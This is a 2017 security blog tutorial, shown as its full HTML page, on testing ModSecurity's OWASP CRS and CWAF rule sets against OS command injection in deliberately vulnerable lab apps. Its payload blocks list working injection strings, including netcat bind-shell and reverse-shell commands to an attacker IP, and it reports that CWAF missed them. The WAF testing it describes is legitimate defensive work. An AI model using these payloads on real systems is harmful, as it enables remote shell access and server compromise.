<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="Fools Of Security are Information Security Enthusiast. We are an Open Source Knowledge sharing platform Relating to Information security and its advancements.">
  <meta name="author" content="Fools Of Security">
  <meta name="keywords" content="">
  <link rel="canonical" href="/waf/2017/06/14/WAF-Rule-Testing-(OS-Command-injection-Rules).html">
  <title> Fools Of Security&ensp;| WAF Rule Testing (OS Command injection Rules)</title>

  <!-- Bootstrap Core CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">

  <!-- Custom CSS -->
  <link href="/css/grayscale.css" rel="stylesheet"><!-- Custom Fonts -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
  <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
  <link href="//fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="/css/rrssb.css" />
  <link rel="stylesheet" href="/css/custom.css" />
  <meta name="theme-color" content="#000000">
  <!-- Windows Phone -->
  <meta name="msapplication-navbutton-color" content="#000000">
  <!-- iOS Safari -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
<!-- Syntax highlight in post pages -->
  <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.2/styles/monokai_sublime.min.css"></head>
<body>
<nav class="navbar navbar-custom navbar-fixed-top" role="navigation">
  <div class="container">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-main-collapse">
        <i class="fa fa-bars"></i>
      </button><a class="navbar-brand" href="/"><div><img src="/img/fos-border.ico" alt=""> Fools Of Security
          </div>
        </a>
    </div>
    <!-- Collect the nav links, forms, and other content for toggling -->
    <div class="collapse navbar-collapse navbar-right navbar-main-collapse">
      <ul class="nav navbar-nav"><!-- Blog, Post, Tag and Error pages --><li><a href="/#about"> About </a></li><li><a href="/blog/"> Blog </a></li><li><a href="/video/"> Video </a></li><li><a href="/#timeline"> Timeline </a></li><li><a href="/project/"> Project </a></li><li><a href="/#contact"> Contact </a></li></ul>
    </div>
  </div>
</nav>

<section id="post" class="container content-section text-center">
      <div class="row">
        <div class="col-md-10 col-md-offset-1">
          <h1><strong>WAF Rule Testing (OS Command injection Rules)</strong></h1>
          <h4>
            <strong>14 Jun 2017</strong>
            <small>
              . category:
              <a class="category" href="/categories/waf.html">
                waf
              </a>.
              <a href="/waf/2017/06/14/WAF-Rule-Testing-(OS-Command-injection-Rules).html#disqus_thread">Comments</a>
              <br /><a class="tag" href="/tags/tutorial.html">#tutorial</a></small>
          </h4>

          <section class="text-justify">
            <p>Testing OS command injection attack on vulnerable application with OWASP CRS &amp;&amp; CWAF Ruleset.</p>

<p><strong>How to identify the flaw on OWASP CRS &amp;&amp; CWAF Ruleset?</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code>1. At first, set up the vulnerable application i.e xvwa,OWASP Mutillidae Vulnerable App on the server for testing   WAF rules.
2. Install modsecurity and include both OWASP CRS &amp;&amp; CWAF ruleset in apache config.
3. Before testing t Vulnerable app, have a complete knowledge about OWASP TOP 10 vulnerability 
   
   How it works?
   How to exploit it?
   What are the modern evasion technique to bypass WAF rules?

4. Read the Modsecurity Reference manual on Github

    Understand how modsecurity works ?
    start analyse the rules?
    Break the regex and analyse how it was developed?
    Start testing regex pattern to understand how prefect it detect payloads? 
    
5. Start testing the vulnerable app. 
</code></pre>
</div>

<p><br /></p>

<p><strong>How to test OS command Injection attack on vulnerable application with OWASP CRS &amp;&amp; CWAF Ruleset?</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code>1. Install Modsecurity and Configure OWASP CRS &amp; CWAF rule set.
2. Install xvwa app and COnfigure it with database.
3. start testing the XVWA app for OS commands injection.
</code></pre>
</div>

<p><br /></p>

<p><strong>Testing OS Command injection attack on OWASP CRS</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code> Note: We can use &amp;&amp; or | or ; to pipe the command to execute.
 Include the OWASP CRS on apache config:

 Test these following payloads on the xvwa vulnerable application for OS command injection.
 
    127.0.0.1 &amp;&amp; cd /root/Desktop/ &amp;&amp; pwd &amp;&amp; service --status-all 
    127.0.0.1 &amp;&amp; ps
    127.0.0.1 &amp;&amp; service mysql status
    127.0.0.1 &amp;&amp; service apache2 status

 As a result, OWASP CRS failed to detect these above Injection Payloads, but it block almost ever major OS Commands injection 
 payloads from execution on server.
 Check the demo video to know more :)
</code></pre>
</div>

<p><br /></p>

<p><strong>Testing OS Command injection attack on CWAF Ruleset</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code> Note: We can use &amp;&amp; or | or ; to pipe the command to execute.
 Include the CWAF ruleset on apache config:
 
 Test these following payloads on the xvwa vulnerable application for OS command injection.
   
    127.0.0.1 &amp;&amp; cd /root/Desktop/ &amp;&amp; pwd &amp;&amp; ps &amp;&amp; service --status-all 
    127.0.0.1 &amp;&amp; cat index.php
    127.0.0.1 &amp;&amp; echo "tell me whoami?  I am Human or AI :)"
    127.0.0.1 &amp;&amp; nc -ln -e /bin/sh -p 9999
    127.0.0.1 &amp;&amp; uname -a
    127.0.0.1 &amp;&amp; netstat -ltnp | grep '80'

    Let try reverse shell scenario:
    127.0.0.1 &amp;&amp; nc -c /bin/sh 192.168.1.12 9999
    Attacker IP - 192.168.1.12
    Attacker Listener port: 9999 

  As a resut, CWAF failed to detect the major OS command injection attack on the application, which lead us to get reverse shell on the server.
  Check the demo video to know more :)
</code></pre>
</div>

<p><br /></p>

<h3 id="demo-video">Demo Video</h3>

<p><a href="https://www.youtube.com/watch?v=U5qmi_yoMQA"><img src="https://img.youtube.com/vi/U5qmi_yoMQA/0.jpg" alt="Alt text" /></a></p>

<h3 id="useful-links">Useful links:</h3>
<ol>
  <li><a href="www.modsecurity.com/">Modsecurity</a></li>
  <li><a href="https://www.kali.org/">Kali</a></li>
  <li><a href="https://www.debuggex.com/">Debuggex</a></li>
  <li><a href="https://www.owasp.org/index.php/OWASP_Mutillidae_2_Project">OWASP Mutillidae Vulnerable App</a></li>
  <li><a href="https://github.com/s4n7h0/xvwa">XVWA</a></li>
  <li><a href="https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual#UNIX">Modsecurity Reference Manual</a></li>
</ol>

          </section>
          <br><div class="sharing">
    <br/>
    <br/>
    <ul>
        <li><i class="fa fa-share-square-o"></i></li>
        
        <li><a href="mailto:?subject=WAF Rule Testing (OS Command injection Rules)&body=http://foolsofsecurity.com/waf/2017/06/14/WAF-Rule-Testing-(OS-Command-injection-Rules).html" rel="nofollow" target="_blank" title="Share on Email">
                <i class="fa fa-envelope-square"></i>
        </a></li>
        
        
        <li><a href="http://www.linkedin.com/shareArticle?url=http://foolsofsecurity.com/waf/2017/06/14/WAF-Rule-Testing-(OS-Command-injection-Rules).html&title=WAF Rule Testing (OS Command injection Rules)" rel="nofollow" target="_blank" title="Share on LinkedIn">
                <i class="fa fa-linkedin-square"></i>
        </a></li>
        
        
        <li><a href="https://twitter.com/intent/tweet?text=WAF Rule Testing (OS Command injection Rules)&url=http://foolsofsecurity.com/waf/2017/06/14/WAF-Rule-Testing-(OS-Command-injection-Rules).html" rel="nofollow" target="_blank" title="Share on Twitter">
                <i class="fa fa-twitter-square"></i>
        </a></li>
        
        
        <li><a href="https://facebook.com/sharer.php?u=http://foolsofsecurity.com/waf/2017/06/14/WAF-Rule-Testing-(OS-Command-injection-Rules).html" rel="nofollow" target="_blank" title="Share on Facebook">
                <i class="fa fa-facebook-square"></i>
        </a></li>
        

        
        <li><a href="https://plus.google.com/share?url=http://foolsofsecurity.com/waf/2017/06/14/WAF-Rule-Testing-(OS-Command-injection-Rules).html" rel="nofollow" target="_blank" title="Share on Google+">
                <i class="fa fa-google-plus-square"></i>
        </a></li>
        

        
        <li><a href="http://reddit.com/submit?url=http://foolsofsecurity.com/waf/2017/06/14/WAF-Rule-Testing-(OS-Command-injection-Rules).html&title=WAF Rule Testing (OS Command injection Rules)" rel="nofollow" target="_blank" title="Share on Reddit">
                <i class="fa fa-reddit-square"></i>
        </a></li>
        
        
        <li><a href="https://pinterest.com/pin/create/button/?url=http://foolsofsecurity.com/waf/2017/06/14/WAF-Rule-Testing-(OS-Command-injection-Rules).html" rel="nofollow" target="_blank" title="Share on Pinterest">
                <i class="fa fa-pinterest-square"></i>
        </a></li>
        
    </ul>
</div>
<br/>
<br/><div id="disqus_thread"></div>
  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript><hr /><div class="author row">
            <img class="col-xs-4 col-sm-3 col-md-2" src="/img/author.png" alt="Me" />
            <p class="col-xs-8 col-sm-9 col-md-10">
              Umar Farook is an Security Researcher & AppSec Enthusiast. He always approach App Security with innovative ideas  to explore and prevent Modern web application attacks. In spare time, he work on scrapying data from website and automating AppSec with Python.
            </p>
          </div></div>
      </div>
    </section>
<footer>
    <br>
<ul class="list-inline social-buttons"><li><a href="https://github.com/umarfarook882" target="_blank"><i class="fa fa-github fa-fw"></i></a></li><li><a href="https://www.youtube.com/channel/UCEBHO0kD1WFvIhf9wBCU-VQ" target="_blank"><i class="fa fa-youtube-play fa-fw"></i></a></li><li><a href="http://fosecurity.blogspot.in/" target="_blank"><i class="fa fa-globe fa-fw"></i></a></li></ul>

<p><br></p>
    <div class="container text-center">
        <p>Copyright &copy; Fools Of Security 2017</p><p style="font-size: 16px;"><a href="https://zerobin.net/?f1744fd662ccc911#AknpWQMXs3ZSDTvvgLTD67W7D9PrlI5vv06zDDG217I=" target="_blank"><i
                class="fa fa-key"></i> Fools of Security via PGP</a></p></div>
</footer>

<!-- Javascript Start -->
<!-- jQuery -->
<script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>

<!-- Bootstrap Core JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>

<!-- Plugin JavaScript -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js"></script>

<script>
function toggleNavCollapse(){50<$(".navbar").offset().top?$(".navbar-fixed-top").addClass("top-nav-collapse"):$(".navbar-fixed-top").removeClass("top-nav-collapse");}
$(document).ready(toggleNavCollapse);
$(window).scroll(toggleNavCollapse);$(function(){$("a.page-scroll").bind("click",function(b){var a=$(this);$("html, body").stop().animate({scrollTop:$(a.attr("href")).offset().top-50},1500,"easeInOutExpo",function(){a.blur()});b.preventDefault()})});$(".navbar-collapse ul li a").click(function(){$(".navbar-toggle:visible").click()});
</script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.2/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>

    <script type="text/javascript">
    var disqus_shortname = 'foolsofsecurity-com';
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
    </script>
  <script src="/js/rrssb.min.js"></script><script>
function addTohistory() {
  if (!window.location.host.startsWith("127.0.0.1")) {
    history.pushState({}, 'WAF Rule Testing (OS Command injection Rules)', 'http://foolsofsecurity.com/waf/2017/06/14/WAF-Rule-Testing-(OS-Command-injection-Rules).html');
  }
}
</script>

<!-- Javascript End -->
</body>
</html>

